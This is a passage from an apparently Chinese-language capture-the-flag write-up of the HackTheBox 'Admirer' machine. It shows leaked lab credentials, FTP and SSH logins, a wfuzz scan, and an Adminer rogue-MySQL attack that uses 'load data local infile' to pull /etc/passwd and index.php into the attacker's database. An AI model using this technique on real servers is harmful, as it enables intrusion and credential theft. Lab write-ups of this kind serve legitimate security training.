<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##########</span><br><span class="line"># admins #</span><br><span class="line">##########</span><br><span class="line"># Penny</span><br><span class="line">Email: p.wise@admirer.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># developers #</span><br><span class="line">##############</span><br><span class="line"># Rajesh</span><br><span class="line">Email: r.nayyar@admirer.htb</span><br><span class="line"></span><br><span class="line"># Amy</span><br><span class="line">Email: a.bialik@admirer.htb</span><br><span class="line"></span><br><span class="line"># Leonard</span><br><span class="line">Email: l.galecki@admirer.htb</span><br></pre></td></tr></table></figure>
<p>credential.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Bank Account]</span><br><span class="line">waldo.11</span><br><span class="line">Ezy]m27&#125;OREc$</span><br><span class="line"></span><br><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q#S\W:$P</span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R$tTF7</span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure>
<p>用FTP account登录FTP服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 10.10.10.187</span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.187:kali): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">dump.sql</span><br><span class="line">html.tar.gz</span><br><span class="line">ftp&gt; get dump.sql</span><br><span class="line">ftp&gt; get html.tar.gz</span><br></pre></td></tr></table></figure>
<p>dump.sql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: admirerdb</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version	10.1.41-MariaDB-0+deb9u1</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_RESULTS&#x3D;@@CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_COLLATION_CONNECTION&#x3D;@@COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET NAMES utf8mb4 *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET @OLD_TIME_ZONE&#x3D;@@TIME_ZONE *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;&#39;+00:00&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_UNIQUE_CHECKS&#x3D;@@UNIQUE_CHECKS, UNIQUE_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_FOREIGN_KEY_CHECKS&#x3D;@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_SQL_MODE&#x3D;@@SQL_MODE, SQL_MODE&#x3D;&#39;NO_AUTO_VALUE_ON_ZERO&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET @OLD_SQL_NOTES&#x3D;@@SQL_NOTES, SQL_NOTES&#x3D;0 *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;items&#96;;</span><br><span class="line">&#x2F;*!40101 SET @saved_cs_client     &#x3D; @@character_set_client *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; utf8 *&#x2F;;</span><br><span class="line">CREATE TABLE &#96;items&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;thumb_path&#96; text NOT NULL,</span><br><span class="line">  &#96;image_path&#96; text NOT NULL,</span><br><span class="line">  &#96;title&#96; text NOT NULL,</span><br><span class="line">  &#96;text&#96; text,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;13 DEFAULT CHARSET&#x3D;utf8mb4;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; @saved_cs_client *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;items&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;items&#96; VALUES (1,&#39;images&#x2F;thumbs&#x2F;thmb_art01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;art01.jpg&#39;,&#39;Visual Art&#39;,&#39;A pure showcase of skill and emotion.&#39;),(2,&#39;images&#x2F;thumbs&#x2F;thmb_eng02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng02.jpg&#39;,&#39;The Beauty and the Beast&#39;,&#39;Besides the technology, there is also the eye candy...&#39;),(3,&#39;images&#x2F;thumbs&#x2F;thmb_nat01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;nat01.jpg&#39;,&#39;The uncontrollable lightshow&#39;,&#39;When the sun decides to play at night.&#39;),(4,&#39;images&#x2F;thumbs&#x2F;thmb_arch02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch02.jpg&#39;,&#39;Nearly Monochromatic&#39;,&#39;One could simply spend hours looking at this indoor square.&#39;),(5,&#39;images&#x2F;thumbs&#x2F;thmb_mind01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind01.jpg&#39;,&#39;Way ahead of his time&#39;,&#39;You probably still use some of his inventions... 500yrs later.&#39;),(6,&#39;images&#x2F;thumbs&#x2F;thmb_mus02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus02.jpg&#39;,&#39;The outcomes of complexity&#39;,&#39;Seriously, listen to Dust in Interstellar\&#39;s OST. Thank me later.&#39;),(7,&#39;images&#x2F;thumbs&#x2F;thmb_arch01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch01.jpg&#39;,&#39;Back to basics&#39;,&#39;And centuries later, we want to go back and live in nature... Sort of.&#39;),(8,&#39;images&#x2F;thumbs&#x2F;thmb_mind02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind02.jpg&#39;,&#39;We need him back&#39;,&#39;He might have been a loner who allegedly slept with a pigeon, but that brain...&#39;),(9,&#39;images&#x2F;thumbs&#x2F;thmb_eng01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng01.jpg&#39;,&#39;In the name of Science&#39;,&#39;Some theories need to be proven.&#39;),(10,&#39;images&#x2F;thumbs&#x2F;thmb_mus01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus01.jpg&#39;,&#39;Equal Temperament&#39;,&#39;Because without him, music would not exist (as we know it today).&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET SQL_MODE&#x3D;@OLD_SQL_MODE *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET FOREIGN_KEY_CHECKS&#x3D;@OLD_FOREIGN_KEY_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET UNIQUE_CHECKS&#x3D;@OLD_UNIQUE_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_CLIENT&#x3D;@OLD_CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_RESULTS&#x3D;@OLD_CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET COLLATION_CONNECTION&#x3D;@OLD_COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET SQL_NOTES&#x3D;@OLD_SQL_NOTES *&#x2F;;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2019-12-02 20:24:15</span><br></pre></td></tr></table></figure>
<p>解压html.tar.gz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html [12:51:51] </span><br><span class="line">$ ls -l</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 6 kali kali 4096 6月   7  2019 assets</span><br><span class="line">drwxr-x--- 4 kali kali 4096 12月  3 04:29 images</span><br><span class="line">-rw-r----- 1 kali kali 4613 12月  4 04:20 index.php</span><br><span class="line">-rw-r----- 1 kali kali  134 12月  2 05:31 robots.txt</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:50 utility-scripts</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:25 w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure>
<p>utility-scripts目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:54] </span><br><span class="line">$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:50 .</span><br><span class="line">drwx------ 6 kali kali 4096 5月  20 14:29 ..</span><br><span class="line">-rw-r----- 1 kali kali 1795 12月  3 01:48 admin_tasks.php</span><br><span class="line">-rw-r----- 1 kali kali  401 12月  2 06:28 db_admin.php</span><br><span class="line">-rw-r----- 1 kali kali   20 11月 30 03:32 info.php</span><br><span class="line">-rw-r----- 1 kali kali   53 12月  3 01:40 phptest.php</span><br></pre></td></tr></table></figure>
<p>admin_tasks.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Administrative Tasks&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Web Interface to the admin_tasks script</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;task&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    $task = $_REQUEST[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($task == <span class="string">&#x27;1&#x27;</span> || $task == <span class="string">&#x27;2&#x27;</span> || $task == <span class="string">&#x27;3&#x27;</span> || $task == <span class="string">&#x27;4&#x27;</span> ||</span><br><span class="line">       $task == <span class="string">&#x27;5&#x27;</span> || $task == <span class="string">&#x27;6&#x27;</span> || $task == <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*********************************************************************************** </span></span><br><span class="line"><span class="comment">         Available options:</span></span><br><span class="line"><span class="comment">           1) View system uptime</span></span><br><span class="line"><span class="comment">           2) View logged in users</span></span><br><span class="line"><span class="comment">           3) View crontab (current user only)</span></span><br><span class="line"><span class="comment">           4) Backup passwd file (not working)</span></span><br><span class="line"><span class="comment">           5) Backup shadow file (not working)</span></span><br><span class="line"><span class="comment">           6) Backup web data (not working)</span></span><br><span class="line"><span class="comment">           7) Backup database (not working)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           <span class="doctag">NOTE:</span> Options 4-7 are currently NOT working because they need root privileges.</span></span><br><span class="line"><span class="comment">                 I&#x27;m leaving them in the valid tasks in case I figure out a way</span></span><br><span class="line"><span class="comment">                 to securely run code as root from a PHP page.</span></span><br><span class="line"><span class="comment">      ************************************************************************************/</span></span><br><span class="line">      <span class="keyword">echo</span> str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, shell_exec(<span class="string">&quot;/opt/scripts/admin_tasks.sh <span class="subst">$task</span> 2&gt;&amp;1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;Invalid task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;h4&gt;Select task:&lt;/p&gt;</span><br><span class="line">  &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;select name=<span class="string">&quot;task&quot;</span>&gt;</span><br><span class="line">      &lt;option value=<span class="number">1</span>&gt;View system uptime&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">2</span>&gt;View logged in users&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">3</span>&gt;View crontab&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">4</span> disabled&gt;Backup passwd file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">5</span> disabled&gt;Backup shadow file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">6</span> disabled&gt;Backup web data&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">7</span> disabled&gt;Backup database&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>db_admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  $username = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  $password = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create connection</span></span><br><span class="line">  $conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check connection</span></span><br><span class="line">  <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Finish implementing this or find a better open source alternative</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>info.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>phptest.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;Just a test to see if PHP works.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>暴露了一个数据库的用户名和密码。但是后面的注释提示<code>a better open source alternative</code>，用wfuzz扫描该目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:55] </span><br><span class="line">$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line">Total requests: 61419</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000005617:   200        51 L     235 W    4156 Ch     &quot;adminer - php&quot;</span><br><span class="line">000028852:   200        964 L    4976 W   84023 Ch    &quot;info - php&quot;</span><br><span class="line">000041602:   200        0 L      8 W      32 Ch       &quot;phptest - php&quot;</span><br><span class="line"></span><br><span class="line">Total time: 266.5721</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61416</span><br><span class="line">Requests&#x2F;sec.: 230.4028</span><br></pre></td></tr></table></figure>
<p>访问<code>http://10.10.10.178/utility-scripts/adminer.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521131354.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>用之前得到的用户名和密码尝试登录失败，Google <code>Adminer database manager</code>，得到一种利用方式：</p>
<blockquote>
<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">Serious Vulnerability Discovered in Adminer database Administration Tool</a></p>
</blockquote>
<p>简单来讲就是，先配置本地的MySQL数据库，允许远程连接登录，然后用靶机上的adminer database manager连接我们本地的数据库，再将靶机的敏感文件通过adminer写入数据库，最后从本地读取敏感文件。</p>
<p>在kali上用root登录MySQL，新建一个数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE DATABASE admirer;</span><br></pre></td></tr></table></figure>
<p>创建一个用户，如果想让该用户可以<strong>从任意远程主机登陆</strong>，可以使用通配符<code>%</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;;</span><br></pre></td></tr></table></figure>
<p>给新用户授权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>重新加载权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>创建新数据表<code>test</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(admirer)]&gt; create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>
<p>配置数据库使得能远程连接，修改<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind-address      &#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>
<p>重启MySQL服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>
<p>在本地验证能否登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mysql -h localhost -u demo -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 42</span><br><span class="line">Server version: 10.3.22-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>
<p>成功登录，在adminer页面远程登录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521155908.png" alt=""></p>
<p>It Work！！！</p>
<p>验证能否使用<code>load data infile</code>语句读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">into table test</span><br><span class="line">fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160523.png" style="zoom:67%;" />
<p>看一下phpinfo()：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160942.png" alt=""></p>
<p><code>open_basedir</code>限制了根路径，尝试读取<code>index.php</code>文件：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163446.png" style="zoom:67%;" />
<p>读取成功，用Select语句显示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163826.png" alt=""></p>
<p>得到<code>waldo: &amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;</code>凭证用来登录SSH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh waldo@10.10.10.187</span><br><span class="line">waldo@10.10.10.187&#39;s password: </span><br><span class="line">Linux admirer 4.9.0-12-amd64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">The programs included with the Devuan GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Devuan GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3</span><br><span class="line">waldo@admirer:~$ id</span><br><span class="line">uid&#x3D;1000(waldo) gid&#x3D;1000(waldo) groups&#x3D;1000(waldo),1001(admins)</span><br><span class="line">waldo@admirer:~$ cat user.txt </span><br><span class="line">7222------------------------2c18</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>查看waldo能运行的脚本或程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span><br><span class="line"></span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br></pre></td></tr></table></figure>
<p>admin_tasks.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-interactive way, to be used by the web interface</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    option=<span class="variable">$1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        1) 